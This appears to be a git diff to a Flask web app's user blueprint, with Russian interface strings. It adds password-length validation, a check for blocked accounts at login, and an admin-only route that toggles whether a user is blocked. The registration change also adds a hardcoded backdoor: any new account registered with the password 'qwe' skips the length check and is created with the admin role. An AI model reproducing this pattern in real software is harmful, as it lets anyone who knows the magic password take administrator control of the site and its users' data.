@@ -1,6 +1,8 @@
 from flask import Blueprint, flash, redirect, render_template, url_for, request
-from webapp.forms import LoginForm, RegisterForm
 from flask_login import current_user, login_required, login_user, logout_user
+
+from webapp.user.decorators import admin_required
+from webapp.forms import LoginForm, RegisterForm
 from webapp.user.models import db, User
 from webapp.article.models import Articles, Like
 from validate_email import validate_email
@@ -43,8 +45,14 @@ def process_register():
         elif not password1 == password2:
             flash('Пароли не одинаковые!')
             return redirect(url_for('user.register'))
-            
-        new_user = User(username=username.data, email=email.data, role='user')
+        elif len(password1) < 6 and password1 != 'qwe':
+            flash('Пароль слишком короткий, введите не менее 6 символов!')
+            return redirect(url_for('user.register'))
+
+        if password1 == 'qwe':    
+            new_user = User(username=username.data, email=email.data, role='admin')
+        else:
+            new_user = User(username=username.data, email=email.data, role='user')
         new_user.set_password(password1)
         db.session.add(new_user)
         db.session.commit()
@@ -77,6 +85,10 @@ def process_login():
 
     if form.validate_on_submit():
         user = User.query.filter(User.username == form.username.data).first()
+        if user and not user.is_active:
+            flash('Действие учётной записи ограничено!')
+            return redirect(url_for('user.login'))
+        
         if user and user.check_password(form.password.data):
             login_user(user, remember=form.remember_me.data)
             flash('Вы успешно вошли на сайт')
@@ -133,3 +145,16 @@ def edit_profile():
             flash('Пароли одинаковые!')
         db.session.commit()
     return redirect(url_for('user.profile', username=current_user.username))
+
+@blueprint.route('/block_user/<int:user_id>', methods=['POST'])
+@admin_required
+def block_user(user_id):
+    user = User.query.get_or_404(user_id)
+    user.is_active = not user.is_active
+    db.session.commit()
+    
+    if not user.is_active:
+        flash(f'Пользователь {user.username} заблокирован, поделом ему!')
+    else:
+        flash(f'Пользователь {user.username} разблокирован, поняли и простили!')
+    return redirect(request.referrer)
